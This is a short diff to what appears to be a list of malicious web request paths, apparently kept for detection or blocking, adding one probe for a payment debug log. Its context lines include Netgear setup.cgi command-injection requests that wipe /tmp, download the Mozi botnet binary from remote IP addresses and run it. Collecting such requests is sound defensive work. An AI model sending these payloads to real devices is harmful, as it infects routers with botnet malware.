@@ -24952,3 +24952,4 @@ packetsdatabase.com:443
 /wp-admin/.wp-admin.php?slince_golden=test
 /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://182.127.123.76:38272/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
 /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://179.87.101.63:53571/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
+/storage/logs/virtualmerchantpro_debuger.txt
